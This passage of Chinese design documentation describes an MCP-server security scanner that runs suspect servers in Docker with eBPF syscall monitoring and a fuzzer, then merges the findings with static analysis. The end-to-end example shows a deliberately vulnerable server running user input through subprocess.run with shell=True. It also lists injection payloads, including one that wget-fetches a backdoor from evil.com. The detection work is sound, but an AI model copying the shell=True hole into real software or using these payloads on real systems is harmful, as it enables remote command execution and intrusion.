                name="command_exec",
                confidence=confidence,
                score_weight=25.0,
                sources=[EvidenceSource.DYNAMIC],       # ★ 标记为动态证据
            ))

        # ② 文件读取检测
        file_read_events = [e for e in events if e.signature_id in ("FILE_READ", "FILE_OPEN")]
        if file_read_events:
            # 区分敏感文件读取 vs 普通文件读取
            sensitive_files = [path for path in read_files if _is_sensitive_path(path)]
            if sensitive_files:
                confidence = 0.90                       # 敏感文件 → 高置信度
            else:
                confidence = 0.70                       # 普通文件 → 中置信度

        # ③ 文件写入检测
        file_write_events = [e for e in events if e.signature_id == "FILE_WRITE"]
        ...

        # ④ 网络连接检测（过滤本地回环）
        net_events = [e for e in events if e.signature_id == "NET_CONNECT"]
        destinations = {e.extensions["dst"] for e in net_events
                        if not dst.startswith("127.") and not dst.endswith(":0")}
        if destinations:
            # 对 IP 做反向 DNS 查询，增加可读性
            resolved = [format_network_destination(d) for d in destinations]
            ...

        return findings
```

### 9.3 置信度计算逻辑

| 行为 | 条件 | 置信度 |
|------|------|--------|
| 命令执行 | 执行了 1 个命令 | 0.70 |
| 命令执行 | 执行了 ≥3 个命令 | 0.90+ |
| 文件读取 | 未访问敏感路径 | 0.70 |
| 文件读取 | 访问了 `/etc/passwd`、`/.ssh` 等 | 0.90 |
| 文件写入 | 存在写操作 | 0.75 |
| 网络连接 | 连接了外部地址 | 0.60 + 0.08 × 目标数 |
| 环境变量访问 | 读取了环境变量 | 0.75 |

### 9.4 网络目标的反向 DNS 解析

```python
@lru_cache(maxsize=256)
def reverse_dns_lookup(ip):
    """104.16.11.34 → "registry.npmjs.org" """
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        return hostname
    except socket.herror:
        return None

def format_network_destination(dst):
    """104.16.11.34:443 → "registry.npmjs.org (104.16.11.34:443)" """
    ip, port = dst.rsplit(":", 1)
    domain = reverse_dns_lookup(ip)
    return f"{domain} ({ip}:{port})" if domain else dst
```

---

## 10. 流水线调度层

**文件位置**: `detection/detection/pipelines/dynamic.py`

### 10.1 三种执行模式

| 模式 | 触发方式 | 说明 |
|------|----------|------|
| `mcp_fuzz` | 目标包含 MCP 入口 | Fuzzer 按 MCP 协议注入 payload |
| `direct_exec` | 目标没有 MCP 入口 | 直接执行目标程序，监控其自然行为 |
| `auto`（默认） | 自动检测 | 先检查是否 MCP 服务器，自动选择 |

### 10.2 执行模式检测

```python
def _detect_execution_mode(target_path):
    # 检测 JavaScript:
    #   检查 package.json 是否有 MCP 字段
    #   检查 index.js 是否包含 "@modelcontextprotocol/sdk"、"mcp"、"server"
    
    # 检测 Python:
    #   检查 .py 文件是否包含 "mcp"、"server"、"contextserver"、"fastmcp"
    
    # 都没检测到 → "direct_exec"
    return "mcp_fuzz" if detected else "direct_exec"
```

### 10.3 Trigger Plan — 静态结果指导动态分析

这是"动静态结合"的关键——**不是盲目 Fuzz，而是根据静态分析发现的风险点来指导动态分析的焦点**。

```python
def _build_trigger_plan(static_result):
    plan = TriggerPlan()

    # 从静态发现中提取信息:
    # ① 有哪些 MCP 工具名？（从 FindingFact 名称模式中提取: ep_<name>_sink_...）
    for finding in static_result.findings:
        if "ep_" in finding.name:
            tool_name = extract_tool_name(f.name)
            plan.target_tools.append(tool_name)

    # ② 涉及哪些风险类别？（rce, file, network）
    plan.risk_categories = extract_categories(static_result.findings)

    # ③ 涉及哪些 Sink 类型？（subprocess.run, eval, http.request...）
    plan.sink_types = extract_sink_types(static_result.findings)

    # ④ 优先级（基于最高严重度）
    plan.priority = "high" if any(f.score_weight >= 0.75) else ...

    return plan
```

**举例**：
```
静态分析发现:
  - run_command → subprocess.run (RCE, HIGH)
  - read_file → open (FILE, MEDIUM)

TriggerPlan:
  execution_mode = "mcp_fuzz"
  target_tools = ["run_command", "read_file"]
  risk_categories = ["rce", "file"]
  sink_types = ["subprocess.run", "open"]
  priority = "high"

→ Fuzzer 优先对 run_command 注入命令注入 payload
          对 read_file 注入路径遍历 payload
```

### 10.4 run_dynamic_pipeline() 主流程

```python
def run_dynamic_pipeline(target_path, registry, sandbox_timeout=30,
                          static_result=None, execution_mode=None):
    # ① 构建 Trigger Plan
    plan = _build_trigger_plan(static_result)

    # ② 选择执行模式
    if execution_mode is None:
        execution_mode = plan.execution_mode

    # ③ 初始化沙箱
    sandbox = DockerSandboxProvider()

    # ④ 在沙箱中运行 + 监控
    sandbox_result = sandbox.run(target_path, timeout=sandbox_timeout,
                                  execution_mode=execution_mode)

    # ⑤ 保存原始日志（用于调试和审查）
    save_cef_logs(sandbox_result.logs)

    # ⑥ 分析行为
    analyzer = DynamicBehaviorAnalyzer()
    findings = analyzer.analyze(sandbox_result.logs, target_path)

    # ⑦ 评分
    total_score = sum(f.confidence * f.score_weight for f in findings)

    # ⑧ 构建详细备注（遥测摘要 + Trigger Plan + 日志预览）
    notes = build_telemetry_notes(sandbox_result, plan, log_file)

    # ⑨ 如果提供了静态结果 → 合并
    if static_result:
        result = _merge_results(static_result, result)

    return result
```

### 10.5 结果合并

```python
def _merge_results(static, dynamic):
    """合并动静态发现——同一能力取最高置信度，合并证据"""
    for dyn_finding in dynamic.findings:
        if dyn_finding.name in static_finding_map:
            static_f = static_finding_map[dyn_finding.name]
            merged = CapabilityFinding(
                name=dyn_finding.name,
                confidence=max(static_f.confidence, dyn_finding.confidence),
                evidence=static_f.evidence + dyn_finding.evidence,
                sources=[STATIC, DYNAMIC],   # ★ 标记双源验证
            )
```

### 10.6 两阶段流水线

```python
def run_two_stage_pipeline(target_path, registry, policy_dir,
                            risk_threshold=50.0, dynamic_timeout=30):
    # Stage 1: 静态分析
    static_result = run_static_pipeline(target_path, registry, policy_dir)

    # 如果静态评分 < 阈值 → 不再做动态分析（节省资源）
    if static_result.total_score < risk_threshold:
        return static_result              # 低风险，不需要动态确认

    # Stage 2: 动态分析（只在高风险时触发）
    try:
        dynamic_result = run_dynamic_pipeline(
            target_path, registry, sandbox_timeout=dynamic_timeout,
            static_result=static_result,
        )
        return dynamic_result
    except RuntimeError:
        return static_result              # 如果沙箱不可用，退回到纯静态
```

---

## 11. 端到端完整流程

让我们用一个具体例子跟踪完整流程。假设有一个 MCP 工具：

```python
# target/server.py
import subprocess
from mcp.server import Server

server = Server("my-server")

@server.tool()
def run_command(cmd: str):
    """Execute a shell command (supposedly harmless)"""
    subprocess.run(cmd, shell=True)       # ← 危险！
```

### Step 1: 静态分析阶段

```
静态分析发现:
  - run_command 是 MCP 入口 (EntryPointFact)
  - cmd 参数是用户输入 (SourceFact)
  - subprocess.run(cmd, shell=True) 是命令执行 Sink (SinkFact)
  - 从入口到 Sink 可达 (ReachabilityResult)
  - 污点数据 cmd 直接传给 Sink (DataFlowFact)
  - FindingFact: category=rce, severity=HIGH, confidence=HIGH
  - 风险评分: 75 分
```

### Step 2: Trigger Plan 构建

```
静态结果:
  - 发现一个高危 RCE 漏洞
  - 涉及工具: run_command
  - 涉及 Sink: subprocess.run
  - 风险类别: rce

TriggerPlan:
  execution_mode = "mcp_fuzz"
  target_tools = ["run_command"]
  risk_categories = ["rce"]
  sink_types = ["subprocess.run"]
  priority = "high"
```

### Step 3: Docker 容器启动

```
DockerSandboxProvider.run():
  ① 创建临时目录 /tmp/mcp-sandbox-xxxx/
  ② 复制 target/ → /tmp/.../target/
  ③ 启动容器:
     - 挂载 target/, logs/, monitor/
     - 设置 MODE=mcp_fuzz, MONITOR_TIMEOUT=30
     - 特权模式 + SYS_ADMIN + PID namespace=host
```

### Step 4: 容器内 entrypoint.sh 执行

```bash
# Phase 1: 准备 cgroup 边界
mkdir /sys/fs/cgroup/mcp-target
MCP_TARGET_CGROUP_ID=$(stat -c "%i" /sys/fs/cgroup/mcp-target)  # 例如: 12345
export MCP_TARGET_CGROUP_ID

# Phase 2: 启动 eBPF Monitor
python3 /monitor/ebpf_monitor.py &             # 后台运行
# Monitor 执行:
#   ① 加载 bpf_programs.c → 编译 → 加载到内核
#   ② 设置 target_cgroup_id[0] = 12345
#   ③ 打开 perf buffer，注册 _handle_event 回调
#   ④ 开始 polling 循环

# Phase 3: 启动 Fuzzer
timeout 30 python3 /monitor/fuzzer.py "python3 /target/server.py" &
```

### Step 5: Fuzzer 注入攻击

```
Fuzzer:
  ① 发送 initialize → 握手成功
  ② 发送 tools/list → 返回 [{"name": "run_command", ...}]
  ③ 识别 run_command 接受 string 参数 "cmd"
  ④ 遍历 payload:
     尝试: cmd = "../../../etc/passwd"  → 发送 tools/call
     尝试: cmd = "; id"                 → 发送 tools/call
     尝试: cmd = "| wget http://evil.com/backdoor.sh" → 发送 tools/call
     ...
```

### Step 6: 内核捕获系统调用

```
当 cmd = "; id" 时:

MCP 服务器进程 (PID=6789):
  subprocess.run("; id", shell=True)
    → Python 内部调用 execve("/bin/bash", ["bash", "-c", "; id"])

Linux Kernel:
  sys_enter_execve tracepoint 触发
    → eBPF 探针检查: bpf_get_current_cgroup_id() == 12345? → YES!
    → 构造 event_data:
        event_type = EVENT_PROC_EXEC (9)
        pid = 6789
        path = "/bin/bash"
        stack_id = <用户态栈回溯>
    → perf_submit → perf buffer
```

### Step 7: Monitor 处理事件

```
eBPF Monitor (perf_buffer_poll):
  收到 perf 事件
    → _handle_event:
      - 读取 event_type: PROC_EXEC
      - 读取 path: /bin/bash
      - 读取 user stack（通过 stack_id）: [0x7f..., 0x7f...]
      - 读取 /proc/6789/cmdline: "python3 /target/server.py"
      - 格式化为 CEF:
        CEF:0|MCP-Security|Dynamic-Detector|1.0|PROC_EXEC|
            Suspicious Command Execution|8|
            rt=2025-01-20T10:15:25.012 suser=root sproc=python 
            spid=6789 dproc=bash cs1=/bin/bash cs1Label=Command 
            ustack=0x7f...|0x7f...

同时还有文件操作:
  openat → FILE_OPEN, dst=/etc/passwd ...
  connect → NET_CONNECT, dst=8.8.8.8:443 ...
```

### Step 8: 日志分析

```
容器退出后，DockerSandboxProvider:
  ① 读取 /logs/events.cef
  ② _parse_cef_logs() 统计:
     - total_events: 47
     - command_executions: 3 (bash, id, wget)
     - file_events: 15
     - network_events: 2 (8.8.8.8:443)
     - sensitive_paths: ["/etc/passwd"]
     - executed_commands: ["/bin/bash", "/usr/bin/id", "/usr/bin/wget"]

DynamicBehaviorAnalyzer.analyze():
  发现:
    - 命令执行: bash, id, wget → command_exec, confidence=0.90
    - 敏感文件读取: /etc/passwd → file_read, confidence=0.90
    - 文件写入: 下载了 backdoor.sh → file_write, confidence=0.75
    - 外部网络连接: 8.8.8.8:443 → network_outbound, confidence=0.68
```

### Step 9: 结果合并

```
静态发现:                          动态发现:
  command_exec   (confidence 0.75)    command_exec   (confidence 0.90)
  file_read      (confidence 0.75)    file_read      (confidence 0.90)
                                      file_write     (confidence 0.75)
                                      network_outbound (confidence 0.68)

合并后:
  command_exec   (confidence 0.90) ← 取 max + 合并证据 + 双源验证
  file_read      (confidence 0.90)
  file_write     (confidence 0.75) ← 动态独占
  network_outbound (confidence 0.68) ← 动态独占

总评分: 90.3  → 风险等级: CRITICAL
```

---

## 12. 动静态结合：两阶段检测

### 12.1 设计理念

```
              ┌─────────────┐
              │  静态分析     │  快速、低成本
              │  (所有样本)   │  覆盖所有样本
              └──────┬──────┘
                     │
              评分 ≥ 50?
           ┌────no────┴────yes───┐
           │                     │
     ┌─────▼──────┐      ┌──────▼──────┐
     │  直接报告    │      │  动态分析     │  慢、高成本
     │  (低风险)    │      │  (高风险确认) │  只对高风险样本
     └────────────┘      └──────┬──────┘
                                │
                         ┌──────▼──────┐
                         │  合并结果    │
                         │  最终报告    │
                         └─────────────┘
```

**为什么？**
- 静态分析**快**（毫秒级），动态分析**慢**（30秒+）
- 大部分 MCP 服务器风险不高，不需要动态确认
- 把昂贵的动态分析"火力"集中在真正需要的地方

### 12.2 动静态关联（AST引擎内）

**文件位置**: `detection/analysis/passes/dynamic_correlation.py`

在 AST 引擎内，有一层更精细的关联：

```
静态分析产出 FindingFact (status=POTENTIAL)
    +
运行时产出 RuntimeEventFact (从 CEF 日志解析)
    ↓
correlate_dynamic():
    
    Level 1 - Exact Match:
      条件: category 匹配
           AND (ustack 包含 sink 所在文件名
                OR target_path 与 sink_arg 重叠)
      结果: POTENTIAL → CONFIRMED, confidence=HIGH
    
    Level 2 - Category Match:
      条件: 只有 category 匹配
      结果: POTENTIAL → CONFIRMED, confidence=HIGH
    
    未匹配的 RuntimeEvent:
      结果: 创建 RUNTIME_ONLY FindingFact
```

---

## 13. CEF 日志格式详解

### 13.1 CEF 头部

```
CEF:Version|Device Vendor|Device Product|Device Version|Signature ID|Name|Severity

CEF:0|MCP-Security|Dynamic-Detector|1.0|PROC_EXEC|Suspicious Command Execution|8
```

| 字段 | 本项目中的值 | 说明 |
|------|-------------|------|
| Version | `0` | CEF 格式版本 |
| Device Vendor | `MCP-Security` | 设备厂商 |
| Device Product | `Dynamic-Detector` | 设备产品 |
| Device Version | `1.0` | 设备版本 |
| Signature ID | `PROC_EXEC` | 事件类型 |
| Name | `Suspicious Command Execution` | 人类可读的事件名 |
| Severity | `8` | 严重度（0-10） |

### 13.2 各事件类型的 CEF 扩展字段

**文件操作事件** (FILE_OPEN, FILE_READ, FILE_WRITE, FILE_UNLINK)：

```
扩展字段:
  rt          = 2025-01-20T10:15:23.456    # 时间戳
  suser       = root                       # 用户名
  sproc       = python                     # 进程名
  spid        = 1234                       # 进程 PID
  dst         = /etc/passwd                # 目标文件路径
  target_path = /etc/passwd                # 目标路径（扩展）
  act         = read                       # 操作类型: open/read/write/unlink
  outcome     = success                    # 结果
  bytesIn     = 2048                       # 读取字节数（FILE_READ）
  fileType    = text                       # 文件类型（FILE_OPEN）
  ustack      = 0x7f...|0x7f...            # 用户态栈回溯（可选）
```

**命令执行事件** (PROC_EXEC)：

```
扩展字段:
  rt          = 2025-01-20T10:15:25.012
  suser       = root
  sproc       = python                     # 触发 exec 的进程名
  spid        = 1234
  dproc       = bash                       # 被执行的程序名
  cs1         = /bin/bash                  # 完整路径
  cs1Label    = Command
  command_args = python3 /target/server.py # 完整命令行参数
  ustack      = 0x7f...|0x7f...
```

**网络连接事件** (NET_CONNECT)：

```
扩展字段:
  rt          = 2025-01-20T10:15:24.789
  suser       = root
  sproc       = python
  spid        = 1234
  dst         = 104.16.11.34:443           # 目标 IP:端口
  dpt         = 443                        # 目标端口
  proto       = tcp                        # 协议
  target_path = 104.16.11.34:443           # 目标（扩展）
  ustack      = 0x7f...|0x7f...
```

---

## 14. 安全与性能考量

### 14.1 安全分层

```
Layer 1: Docker 容器隔离
  - Namespace 隔离（PID, 网络, 挂载点, IPC, UTS）
  - Cgroup 资源限制（CPU, 内存, PID 数）
  - 只读目标挂载

Layer 2: 网络隔离
  - 独立 bridge 网络
  - DNS 阻断（指向 127.0.0.1）
  - 可配置 internal: true（完全断网）

Layer 3: 资源限制
  - 2 CPU 核心上限
  - 2GB 内存上限
  - 512 进程数上限（防止 fork 炸弹）

Layer 4: 时间限制
  - 30 秒超时（默认）
  - 超时后容器被强制终止
```

### 14.2 性能指标

| 指标 | 值 | 说明 |
|------|-----|------|
| 启动开销 | ~2 秒 | 启动 Docker 容器 + 加载 eBPF 程序 |
| eBPF 事件捕获率 | ~10K 事件/秒 | perf buffer 吞吐量 |
| CPU 开销 | 5-15% 每核 | eBPF 探针的内核开销 |
| 内存开销 | ~100-200 MB | BCC + eBPF maps + Python 运行时 |
| 典型分析时间 | 30 秒 | 默认超时 |

---

## 15. 总结

### 15.1 整个动态分析系统的核心思想

```
目标: 发现静态分析看不到的运行时恶意行为

手段:
  ┌─────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
  │ 隔离执行  │ + │  内核监控  │ + │ 主动 Fuzz │ + │ 关联验证  │
  │ (Docker) │    │  (eBPF)  │    │ (MCP协议) │    │ (静态结果)│
  └─────────┘    └──────────┘    └──────────┘    └──────────┘
  
  安全运行      不可篡改的       触发隐藏行为    提升检测精度
               系统调用记录
```

### 15.2 关键设计决策

1. **eBPF 而非 ptrace/strace**：eBPF 零上下文切换，性能远超 ptrace；且无法被用户态程序检测或绕过
2. **Cgroup v2 边界过滤**：用 cgroup id 而非 PID 来识别目标进程，解决了 fork 子进程追踪和容器 PID 不一致问题
3. **MCP 协议感知 Fuzz**：理解 MCP 工具的参数结构，生成针对性的攻击载荷，比盲 Fuzz 更高效
4. **两阶段流水线**：先静态后动态，把昂贵的动态分析集中在高风险样本上
5. **CEF 标准日志**：使用工业标准格式，支持与 SIEM 系统无缝集成
6. **Trigger Plan**：静态分析的结果指导动态分析的焦点，实现深度联动

### 15.3 动态分析的局限性

| 局限性 | 说明 |
|--------|------|
| 需要 Docker + Linux + 特权模式 | 不是所有环境都能运行 |
| 30秒时间窗口 | 可能遗漏延迟触发或条件触发的恶意行为 |
| Payload 有限 | Fuzzer 只有一组预定义的 payload，可能被绕过 |
| MCP 协议依赖 | 只对通过 MCP 协议交互的程序有效，直接执行的程序监控覆盖较窄 |
| 容器逃逸风险 | 特权模式理论上存在逃逸可能 |

---

> **延伸阅读建议**：
> - [eBPF 官网](https://ebpf.io/) — 入门 eBPF 的最佳起点
> - [BCC 参考指南](https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md) — BCC Python API 文档
> - [Linux tracepoints 文档](https://www.kernel.org/doc/html/latest/trace/tracepoints.html)
> - [CEF 格式标准](https://www.microfocus.com/documentation/arcsight/arcsight-smartconnectors-8.4/cef-implementation-standard/)
> - [Docker 安全最佳实践](https://docs.docker.com/engine/security/)
> - 项目中的 `detection/examples/dynamic_analysis_demo.py` 是一个可运行的演示脚本
